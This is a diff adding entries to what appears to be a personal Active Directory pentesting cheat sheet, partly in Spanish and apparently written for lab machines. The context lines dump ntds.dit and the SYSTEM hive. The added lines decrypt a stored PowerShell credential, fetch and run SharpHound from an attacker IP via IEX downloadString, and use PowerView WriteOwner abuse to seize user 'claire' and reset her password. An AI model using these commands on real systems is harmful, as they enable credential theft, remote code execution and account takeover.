@@ -49,4 +49,28 @@ reg save hklm\system c:\temp\system.bak
 download ntds.dit
 download system
 
+### DECRYPT POWERSHELL CREDENTIALS ###
+
+powershell -c "$credentials = Import-Clixml -Path .\cred.xml;$credentials.GetNetworkCredential().password"
+
+### DOWNLOAD FILE ###
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/SharpHound.exe')
+
+### PERMISOS WRITE OWNER SOBRE USUARIO/GRUPO ###
+
+Set-DomainObjectOwner -identity claire -OwnerIdentity tom 
+
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 
+
+$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
+Set-DomainUserPassword -identity claire -accountpassword $cred
+
+Ahora nos podemos loggear con las credenciales que hemos registrado
+
+### PARA VER LOS PERMISOS ###
+
+icacls <nomnbre archivo/carpeta>
+
+
 
